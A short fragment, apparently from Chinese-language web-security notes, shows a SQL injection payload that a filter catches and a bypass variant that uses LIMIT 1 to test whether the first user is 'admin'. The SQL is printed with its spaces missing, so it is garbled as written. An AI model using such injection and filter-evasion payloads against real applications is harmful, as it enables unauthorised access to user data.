<font style="color:rgb(77, 77, 77);">会过滤的攻击代码1|| (selectuserfromuserswhereuser_id =1) ='admin'</font>

<font style="color:rgb(77, 77, 77);">绕过方式1|| (selectuserfromuserslimit1) ='admin'</font>

